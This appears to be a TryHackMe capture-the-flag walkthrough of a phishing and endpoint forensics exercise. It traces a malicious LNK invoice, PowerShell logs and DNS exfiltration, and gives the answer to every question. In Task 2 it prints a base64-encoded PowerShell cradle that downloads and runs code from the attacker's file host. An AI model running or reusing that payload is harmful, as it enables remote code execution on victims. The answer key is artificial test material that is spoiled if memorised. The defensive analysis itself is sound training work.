---
icon: ghost
cover: >-
  https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/596edd6b80bfcaf4f9bc8e70b33fe4c4.png
coverY: 0
coverHeight: 138
---

# Boogeyman 1

**Date:** 19.05.2026

**Room Category:** Walkthrough&#x20;

**Core Concept:** Phishing analysis, malicious LNK files, PowerShell log analysis, and endpoint investigation using command-line tools.

This challenge focuses on analyzing the Tactics, Techniques, and Procedures (TTPs) of a new threat actor known as Boogeyman. The investigation covers the entire attack lifecycle, from initial access via a phishing email to the eventual exfiltration of sensitive data.

***

## Task 1: \[Introduction] New threat in town.

This scenario introduces a new emerging threat known as the Boogeyman.

The objective is to analyze the Tactics, Techniques, and Procedures (TTPs) executed by a threat group. The analysis covers the entire attack lifecycle, from obtaining initial access to achieving the final objective.

The prerequisites for this investigation require knowledge of phishing analysis, Windows event logs, and network traffic analysis using Wireshark and Tshark.

The provided investigation platform includes several artifacts. These include a copy of the phishing email (`dump.eml`), PowerShell logs from the compromised workstation (`powershell.json`), and a packet capture (`capture.pcapng`).

Several tools are available for the analysis. Thunderbird can be used for email inspection. LNKParse3 is available for examining shortcut files. Wireshark and Tshark are provided for packet analysis. Finally, text-processing utilities like `jq`, `grep`, `sed`, `awk`, and `base64` are available for parsing logs and decoding payloads.

Question: Let's hunt that boogeyman!

> **Answer:** No answer needed

***

## Task 2: \[Email Analysis] Look at that headers!

A finance employee named Julianne received a follow-up email regarding an unpaid invoice from a business partner. The attached document was malicious and compromised the workstation upon execution.

The security team flagged the suspicious execution. Initial trends indicate the attack is attributed to the Boogeyman threat group, which is known for targeting the logistics sector.

The investigation begins with the `dump.eml` file. The email headers and content must be analyzed to understand the delivery mechanism and the payload.

There are two primary methods for this analysis. The email can be opened in a client like Thunderbird to easily extract the attachment. Alternatively, command-line tools can be used to manually decode the base64 payload at the bottom of the file.

Question: What is the email address used to send the phishing email?

> **Answer:** agriffin@bpakcaging.xyz

Question: What is the email address of the victim?

> **Answer:** julianne.westcott@hotmail.com

Question: What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

> **Answer:** elasticemail

Question: What is the name of the file inside the encrypted attachment?

> **Answer:** Invoice\_20230103.lnk

Question: What is the password of the encrypted attachment?

> **Answer:** Invoice2023!

Once the encrypted ZIP archive is bypassed, the extracted file is a Windows Shortcut (LNK) file. The `lnkparse` utility is highly effective for extracting embedded metadata and command-line arguments from these binaries.

```bash
lnkparse Invoice_20230103.lnk
```

Question: Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

> **Answer:** aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==

***

## Task 3: \[Endpoint Security] Are you sure that’s an invoice?

The initial findings reveal that a PowerShell command was executed on the victim's machine. Decoding the payload provides the starting point for tracking the endpoint activities.

The next phase involves analyzing the `powershell.json` logs to uncover the full impact of the attack.

The `jq` command-line utility is perfect for parsing this JSON data. The analyst can filter the output and combine it with text-processing tools to search for specific indicators without manually scrolling through redundant lines.

```bash
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | sort | uniq
```

Question: What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)

> **Answer:** cdn.bpakcaging.xyz,files.bpakcaging.xyz

Question: What is the name of the enumeration tool downloaded by the attacker?

> **Answer:** seatbelt

Question: What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.

> **Answer:** C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes\_8wekyb3d8bbwe\LocalState\plum.sqlite

Question: What is the software that uses the file in Q3?

> **Answer:** Microsoft Sticky Notes

Question: What is the name of the exfiltrated file?

> **Answer:** protected\_data.kdbx

Question: What type of file uses the .kdbx file extension?

> **Answer:** keepass

Question: What is the encoding used during the exfiltration attempt of the sensitive file?

> **Answer:** hex

Question: What is the tool used for exfiltration?

> **Answer:** nslookup

***

## Task 4: \[Network Traffic Analysis] They got us. Call the bank immediately!

The PowerShell logs confirm that the threat actor successfully read and exfiltrated sensitive files. The logs also expose the domains, ports, and the specific tool used for exfiltration.

The final step is to analyze the network traffic stored in the `capture.pcapng` file. This capture contains all commands executed by the attacker and their corresponding outputs.

Filtering the traffic in Wireshark based on the previously discovered IP addresses and domains reveals the command-and-control infrastructure.

Question: What software is used by the attacker to host its presumed file/payload server?

> **Answer:** python

Question: What HTTP method is used by the C2 for the output of the commands executed by the attacker?

> **Answer:** POST

Question: What is the protocol used during the exfiltration activity?

> **Answer:** dns

Investigating the HTTP streams reveals an interaction with the SQLite database identified earlier. Further analysis of the traffic uncovers the master password used by the victim.

Question: What is the password of the exfiltrated file?

> **Answer:** %p9^3!lL^Mz47E2GaT^y

The exfiltrated KeePass database (`.kdbx` file) was encoded and sent out via DNS queries. The `tshark` command-line utility can be used to filter the DNS queries directed at the attacker's infrastructure and strip away the domain name to isolate the raw hex data.

```bash
tshark -r capture.pcapng -Y "ip.dst==167.71.211.113 and dns" -T fields -e dns.qry.name | grep -v bpakcaging.xyz | sed 's/.bpakcaging.xyz//g' | tr -d '\n'
```

Once the hex string is extracted, saved to a file, and converted back to a binary format, the database can be opened using the recovered master password.

Question: What is the credit card number stored inside the exfiltrated file?

> **Answer:** 4024007128269551
